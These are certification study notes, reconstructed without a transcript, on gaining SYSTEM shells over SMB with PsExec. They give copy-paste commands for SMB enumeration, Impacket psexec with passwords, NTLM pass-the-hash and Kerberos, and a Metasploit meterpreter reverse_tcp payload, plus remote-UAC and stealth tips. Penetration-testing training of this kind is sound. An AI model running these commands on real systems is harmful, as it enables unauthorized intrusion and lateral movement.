# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, context-based summary of a typical eJPT lesson titled “Exploiting SMB With PsExec.”

- How to use the PsExec technique over SMB to gain remote command execution on Windows hosts once you have valid admin credentials.
- Why ADMIN$ access matters and how PsExec works (service creation via SMB, then spawning a SYSTEM shell).
- Demonstration with Impacket’s psexec.py (Linux/Kali), plus common alternatives (Sysinternals PsExec.exe and Metasploit’s psexec module).
- Pre-checks (enumerate SMB, validate creds, confirm admin rights) and post-exploitation basics.
- Troubleshooting common errors (UAC remote restrictions, insufficient privileges, SMB/firewall issues).

# Flow (ordered)
1. Discover SMB and identify Windows target (nmap).
2. Enumerate shares and basic info (nmap scripts, smbclient/smbmap).
3. Validate credentials against SMB; confirm they are administrative (ADMIN$).
4. Use Impacket psexec.py to obtain a remote shell (ideally SYSTEM).
5. Verify access and context on the target (whoami /all, hostname, systeminfo).
6. Optional: Use Pass-the-Hash or Kerberos with psexec if only hashes or tickets are available.
7. Alternatives: Sysinternals PsExec.exe (Windows-to-Windows), Metasploit psexec module (to get Meterpreter).
8. Troubleshoot typical failures; perform cleanup if needed.

# Tools highlighted
- nmap (with smb-* scripts)
- smbclient, smbmap
- crackmapexec (CME) for credential validation and quick checks
- Impacket’s psexec.py (or the “impacket-psexec” wrapper)
- Sysinternals PsExec.exe
- Metasploit Framework (exploit/windows/smb/psexec)

# Typical command walkthrough (detailed, copy-paste friendly)
Replace placeholders like <TARGET>, <USER>, <PASS>, <DOMAIN>, <NTLM_HASH>, <LHOST>.

Recon and enumeration:
```
# Discover SMB and enumerate
nmap -p 139,445 -sC -sV <TARGET>

# Deeper SMB enumeration
nmap --script "smb-os-discovery,smb-enum-shares,smb-enum-users" -p445 <TARGET>
```

Validate credentials and confirm admin rights:
```
# List shares with given creds (note quoting to protect special chars)
smbclient -L //<TARGET> -U '<USER>%<PASS>'

# Try accessing ADMIN$ (admin-only). If this works, creds are admin.
smbclient //<TARGET>/ADMIN$ -U '<USER>%<PASS>'

# Alternative quick validation with CME (local account example)
crackmapexec smb <TARGET> -u '<USER>' -p '<PASS>' --local-auth

# Show accessible shares via smbmap
smbmap -H <TARGET> -u '<USER>' -p '<PASS>'
```

Impacket PsExec (password-based):
```
# Impacket wrapper name may be 'psexec.py' or 'impacket-psexec' depending on distro

# Local account (SAM) on the target
psexec.py <USER>:'<PASS>'@<TARGET>

# Domain account
psexec.py '<DOMAIN>/<USER>:<PASS>'@<TARGET>

# Optional: better output handling and PowerShell
psexec.py -codec utf8 -shell-type powershell '<DOMAIN>/<USER>:<PASS>'@<TARGET>
```

Impacket PsExec (Pass-the-Hash):
```
# If you only have the NTLM hash (no password):
# Use the format -hashes LMHASH:NTHASH. If LM hash unknown, leave it empty (just the colon).
psexec.py -hashes :<NTLM_HASH> <USER>@<TARGET>

# Domain account with hash
psexec.py -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET>
```

Impacket PsExec (Kerberos ticket):
```
# Acquire a TGT (ensure /etc/krb5.conf is set for the domain)
kinit <USER>@<DOMAIN>

# Use Kerberos (-k) and avoid password prompt (-no-pass). Specify DC if needed.
psexec.py -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>'@<TARGET>
```

Post-exploitation basics once you get a shell:
```
whoami
whoami /all
hostname
ipconfig /all
systeminfo
dir C:\
```

Alternative: Sysinternals PsExec.exe (from a Windows box):
```
# Run CMD on the remote host
PsExec.exe \\<TARGET> -u <USER> -p <PASS> cmd.exe

# Or run a one-liner command remotely (e.g., whoami)
PsExec.exe \\<TARGET> -u <USER> -p <PASS> cmd.exe /c whoami
```

Alternative: Metasploit psexec for Meterpreter:
```
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASS>
# set SMBDomain <DOMAIN>   # if applicable
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
run
```

Cleanup (if a service is left behind — Impacket removes it automatically in most cases):
```
# List services and remove stale one if necessary (example name)
sc query state= all | findstr /I "remcom psexec"
sc delete <ServiceName>
```

# Practical tips
- Admin rights required: PsExec needs rights to create a service and access ADMIN$. If ADMIN$ is inaccessible, you likely lack admin rights or are blocked by remote UAC.
- Remote UAC (filtered token): Local admin accounts (not the built-in Administrator) can be “filtered” over the network. Use the built-in Administrator, a domain admin, or set LocalAccountTokenFilterPolicy (defenders often block this).
- Encoding/terminal quirks: Use -codec utf8 in Impacket to avoid garbled output.
- Firewall/SMB: Ensure TCP/445 is reachable and local firewalls aren’t blocking SMB or Service Control Manager (SCM) operations.
- Pass-the-Hash: Works when NTLM is accepted and SMB signing/policies allow it. Supply -hashes :<NTHASH>.
- Privilege level: Successful PsExec typically lands you as NT AUTHORITY\SYSTEM because the service runs as LocalSystem.
- OPSEC: PsExec service creation is noisy (Windows Event 7045, 4697). wmiexec.py is stealthier but slower; psexec is fast and reliable.
- Quoting: Quote passwords containing special characters, e.g., psexec.py <USER>:'P@ssw0rd!'@<TARGET>.
- Domain vs local: For domain, use '<DOMAIN>/<USER>:<PASS>'@<TARGET>. For local, <USER>:'<PASS>'@<TARGET> is sufficient.
- If using CME to verify admin: Running a simple command helps confirm execution rights:
  crackmapexec smb <TARGET> -u '<USER>' -p '<PASS>' --local-auth -x "whoami"

# Minimal cheat sheet (one-screen flow)
```
# 1) Recon
nmap -p 139,445 -sC -sV <TARGET>
nmap --script smb-os-discovery,smb-enum-shares -p445 <TARGET>

# 2) Validate creds and admin
smbclient -L //<TARGET> -U '<USER>%<PASS>'
smbclient //<TARGET>/ADMIN$ -U '<USER>%<PASS>'          # success = admin
crackmapexec smb <TARGET> -u '<USER>' -p '<PASS>' --local-auth

# 3) Get a shell (Impacket PsExec)
psexec.py <USER>:'<PASS>'@<TARGET>
# or domain
psexec.py '<DOMAIN>/<USER>:<PASS>'@<TARGET>
# or Pass-the-Hash
psexec.py -hashes :<NTLM_HASH> <USER>@<TARGET>

# 4) Verify and enumerate
whoami /all
hostname
systeminfo

# 5) Alternative (Windows)
PsExec.exe \\<TARGET> -u <USER> -p <PASS> cmd.exe

# 6) Alternative (Metasploit)
use exploit/windows/smb/psexec
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASS>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
run
```

# Summary
- PsExec over SMB is a reliable post-auth technique to execute commands remotely on Windows by creating a temporary service via ADMIN$.
- Before launching PsExec, ensure SMB is exposed, credentials are valid, and the account has administrative access (ADMIN$).
- Impacket’s psexec.py is the common choice on Kali; it supports passwords, NTLM hashes (Pass-the-Hash), and Kerberos tickets.
- You typically obtain a SYSTEM-level shell upon success. Use standard Windows commands to verify context and proceed with post-exploitation.
- If PsExec fails, check for admin rights, remote UAC, SMB reachability, and consider alternatives (wmiexec.py, WinRM, or Metasploit).